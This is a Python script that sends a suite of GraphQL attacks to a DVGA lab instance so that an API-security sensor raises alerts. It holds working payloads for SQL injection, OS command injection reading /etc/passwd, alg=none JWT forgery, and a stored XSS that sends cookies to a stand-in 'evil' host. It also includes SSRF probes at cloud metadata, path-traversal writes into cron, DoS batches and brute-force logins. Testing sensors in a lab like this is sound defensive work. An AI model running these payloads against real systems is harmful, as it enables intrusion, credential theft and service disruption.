#!/usr/bin/env python3
"""
DVGA Runtime Alert Trigger Script
Target: see dvga_config.yaml (base_url) — a DVGA lab instance.
Purpose: Generate traffic that should surface in your API-security sensor's
runtime detections, exercising the full DVGA vulnerability catalogue.

DVGA is a GraphQL app: every behaviour below is a single POST to /graphql
(batches allowed) or a GET on one of the app's HTML endpoints.

Only run against a DVGA instance you own / are authorised to test.
"""

import argparse
import json
import os
import sys
import time
import uuid

import requests

import dvga_common as dv


def find_config():
    if os.path.exists("dvga_config.yaml"):
        return "dvga_config.yaml"
    return os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "dvga_config.yaml")


session = requests.Session()
session.headers.update({
    "Content-Type": "application/json",
    "Accept": "application/json",
    "User-Agent": "DVGA-Lab-Trigger/1.0",
})

def pretty(resp):
    try:
        return json.dumps(resp.json(), indent=2)
    except Exception:
        return resp.text[:500]

def step(title):
    print(f"\n{'='*60}")
    print(f"  {title}")
    print(f"{'='*60}")

def main():
    ap = argparse.ArgumentParser(description="DVGA runtime alert trigger")
    ap.add_argument("--config", default=find_config())
    args = ap.parse_args()

    cfg = dv.load_config(args.config)
    base = dv.base_url(cfg).rstrip("/")
    gpath = dv.graphql_path(cfg)
    url = base + gpath
    tout = dv.timeout(cfg)

    print(f"[*] Targeting DVGA at {base} (graphql at {gpath})")
    print("[*] This script triggers multiple OWASP API Top 10 style behaviours\n")

    # 1. Introspection — full schema disclosure
    step("1. GraphQL Introspection (schema disclosure)")
    r = session.post(url, json={"query": """
      query { __schema { queryType { name } mutationType { name }
               types { name fields { name } } } }
    """}, timeout=tout)
    print(f"Status: {r.status_code}")
    print(pretty(r)[:800])

    # 2. Excessive Data Exposure — users with password field
    step("2. Excessive Data Exposure — users { password }")
    r = session.post(url, json={"query": "query { users { id username password } }"},
                     timeout=tout)
    print(f"Status: {r.status_code}")
    p = pretty(r)
    print(p[:800] + "..." if len(p) > 800 else p)

    # 3. GraphiQL interface
    step("3. GraphiQL interface (GET /graphiql)")
    r = session.get(f"{base}/graphiql", timeout=tout)
    print(f"Status: {r.status_code} (content-type: {r.headers.get('content-type')})")

    # 4. SQL Injection on pastes(filter:)
    step("4. SQL Injection probes — pastes(filter:)")
    sqli_payloads = [
        "' OR '1'='1",
        "' OR 1=1--",
        "1' OR '1'='1' --",
        "admin' UNION SELECT username,password,email FROM users --",
    ]
    for p in sqli_payloads:
        r = session.post(url, json={"query": 'query { pastes(filter: "%s") { id title content } }' % p},
                         timeout=tout)
        print(f"Payload: {p[:40]:<40} -> {r.status_code}")

    # 5. OS command injection — systemDebug / systemDiagnostics
    step("5. OS Command Injection — systemDebug / systemDiagnostics")
    r = session.post(url, json={"query": "query { systemDebug }"}, timeout=tout)
    print(f"systemDebug -> {r.status_code}")
    for cmd in ("whoami", "id; cat /etc/passwd", "ps aux"):
        r = session.post(url, json={
            "query": "query { systemDiagnostics(username: \"admin\", password: \"changeme\", cmd: \"%s\") }" % cmd,
        }, timeout=tout)
        print(f"systemDiagnostics(cmd={cmd!r}) -> {r.status_code}")
        print(pretty(r)[:300])

    # 6. JWT forgery — me(token:) with a forged identity
    step("6. JWT Forgery — me(token:) with forged identity")
    for identity in ("admin", "operator"):
        forged = dv.make_jwt(identity, alg="none")
        r = session.post(url, json={"query": 'query { me(token: "%s") { id username password } }' % forged},
                         timeout=tout)
        print(f"me(identity={identity!r}) -> {r.status_code}")
        print(pretty(r)[:300])

    # 7. Stored XSS in paste content
    step("7. Stored XSS — createPaste content")
    marker = "XSS" + uuid.uuid4().hex[:6]
    r = session.post(url, json={
        "query": "mutation($t: String!, $c: String!) { createPaste(title: $t, content: $c, public: true, burn: false) { paste { id title } } }",
        "variables": {"t": "xss " + marker, "c": f"<script>document.location='http://evil/?c='+document.cookie</script>"},
    }, timeout=tout)
    print(f"createPaste(xss) -> {r.status_code}")
    print(pretty(r)[:300])

    # 8. SSRF via importPaste
    step("8. SSRF — importPaste(host:)")
    for host in ("169.254.169.254", "127.0.0.1", "localhost", "10.0.0.1"):
        r = session.post(url, json={
            "query": "mutation { importPaste(scheme: \"http\", host: \"%s\", path: \"/latest/meta-data/\", port: 80) { result } }" % host,
        }, timeout=tout)
        print(f"importPaste(host={host}) -> {r.status_code}")
        print(pretty(r)[:300])

    # 9. Path traversal / arbitrary file write via uploadPaste
    step("9. Path Traversal / Arbitrary File Write — uploadPaste(filename:)")
    for fn in ("../../../../tmp/dvga_pwned.txt", "..%2f..%2f..%2fetc/cron.d/dvga", "xss.html"):
        r = session.post(url, json={
            "query": "mutation { uploadPaste(content: \"<script>alert(1)</script>\", filename: \"%s\") { result } }" % fn,
        }, timeout=tout)
        print(f"uploadPaste(filename={fn}) -> {r.status_code}")
        print(pretty(r)[:300])

    # 10. Batch query DoS
    step("10. Batch Query DoS — large GraphQL batch")
    batch = [{"query": "query { pastes(public: true) { id title } }"} for _ in range(200)]
    r = session.post(url, json=batch, timeout=tout)
    print(f"batch(200 ops) -> {r.status_code}")

    # 11. Deep recursion DoS
    step("11. Deep Recursion DoS — nested owner chain")
    depth = 50
    inner = "owner { name }"
    q = "query { pastes { " + ("owner { " * depth + "name" + " }" * depth + " } }" )
    r = session.post(url, json={"query": "query { pastes { id } }"}, timeout=tout)  # safe baseline
    print(f"baseline pastes -> {r.status_code}")
    r = session.post(url, json={"query": q}, timeout=tout)
    print(f"deep-recursion(depth={depth}) -> {r.status_code}")

    # 12. BOLA on pastes — edit/delete a foreign paste
    step("12. BOLA — editPaste/deletePaste on a foreign paste")
    r = session.post(url, json={"query": "mutation { editPaste(id: 1, title: \"HACKED\", content: \"b0la\") { paste { id title } } }"},
                     timeout=tout)
    print(f"editPaste(id=1) -> {r.status_code}")
    r = session.post(url, json={"query": "mutation { deletePaste(id: 1) { result } }"},
                     timeout=tout)
    print(f"deletePaste(id=1) -> {r.status_code}")

    # 13. Weak password / brute-force login
    step("13. Weak Password / Brute-force — login")
    for u, p in [("admin", "changeme"), ("admin", "password"), ("admin", "123456"),
                 ("operator", "password123"), ("operator", "admin"), ("root", "root")]:
        r = session.post(url, json={"query": 'mutation { login(username: "%s", password: "%s") { accessToken } }' % (u, p)},
                         timeout=tout)
        ok = "errors" not in r.json() if r.headers.get("content-type", "").find("json") >= 0 else False
        print(f"login({u}/{p}) -> {r.status_code} {'OK' if ok else 'denied'}")

    # 14. Rapid-fire requests (rate-limit / DoS signal)
    step("14. Rapid-fire requests (rate-limit / DoS signal)")
    for i in range(30):
        session.post(url, json={"query": "query { users { id username } }"}, timeout=tout)
        session.post(url, json={"query": "query { pastes(public: true) { id title } }"}, timeout=tout)
    print("Sent 60 rapid requests")

    # 15. Final checks
    step("15. Final checks")
    r = session.post(url, json={"query": "query { users { id username password } }"}, timeout=tout)
    print(f"users{{password}} -> {r.status_code}")
    r = session.post(url, json={"query": "query { systemHealth }"}, timeout=tout)
    print(f"systemHealth -> {r.status_code}")
    print(pretty(r)[:300])

    print("\n[+] Script finished. Check your sensor's runtime alerts / incidents.")
    print("    Expected signals: Introspection, Excessive Data Exposure, GraphiQL,")
    print("    SQLi, OS Command Injection, JWT Forgery, Stored XSS, SSRF, Path Traversal,")
    print("    Batch/Recursion DoS, BOLA, Weak Password, Rate-limit/DoS.")


if __name__ == "__main__":
    main()
